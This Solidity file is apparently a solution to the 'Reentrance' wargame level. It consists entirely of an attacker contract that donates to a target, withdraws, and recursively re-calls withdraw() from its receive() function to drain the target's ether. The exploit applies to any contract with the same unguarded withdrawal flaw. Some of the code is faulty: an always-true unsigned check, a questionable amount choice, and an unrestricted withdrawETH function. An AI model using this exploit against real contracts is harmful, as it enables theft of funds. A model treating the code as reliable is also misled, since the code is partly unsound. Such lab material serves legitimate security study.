// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {console, Test} from "@forge-std/Test.sol";

import "@openzeppelin-0_6_x/contracts/utils/Address.sol";
import '@openzeppelin-0_6_x/contracts/math/SafeMath.sol';


interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);

}

contract ReentranceAttacker {
    
    IReentrance reentrance;
    
    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }
    
    function attack() public payable {
        require(msg.value == 0.2 ether);

        reentrance.donate{value : 0.2 ether}(address(this));
        reentrance.withdraw(0.2 ether);
    }

    receive() external payable {
        if (msg.sender != address(reentrance)) return;

        uint256 balanceBeforeWithdraw = reentrance.balanceOf(address(this)) ;
        uint256 amountLeft = address(reentrance).balance;

        if(amountLeft >= 0) {
            uint256 amountToWithdraw = amountLeft <= balanceBeforeWithdraw
                ? balanceBeforeWithdraw
                : 0.1 ether;

            reentrance.withdraw(amountToWithdraw);
        }

    }

    function withdrawETH(address payable to, uint256 amountOut) external  {
        Address.sendValue(to, amountOut);
    }

}